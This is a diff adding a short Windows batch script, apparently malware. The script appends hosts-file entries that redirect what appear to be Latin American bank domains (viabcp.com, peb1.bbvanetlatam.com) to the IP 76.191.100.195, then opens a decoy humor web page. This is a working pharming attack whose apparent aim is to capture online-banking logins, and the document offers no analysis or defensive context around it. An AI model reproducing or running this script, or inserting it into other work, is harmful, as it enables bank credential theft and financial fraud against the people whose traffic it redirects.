@@ -1,0 +1,8 @@
+@echo off
+echo 76.191.100.195  www.viabcp.com >>%windir%\system32\drivers\etc\hosts
+echo 76.191.100.195  http://viabcp.com >>%windir%\system32\drivers\etc\hosts
+echo 76.191.100.195  viabcp.com >>%windir%\system32\drivers\etc\hosts
+echo 76.191.100.195  peb1.bbvanetlatam.com >>%windir%\system32\drivers\etc\hosts
+start http://www.humor12.com/perdoname-171c.html
+exit
+echo > "C:\WINDOWS\TEMP\tmpfile0.tmp"
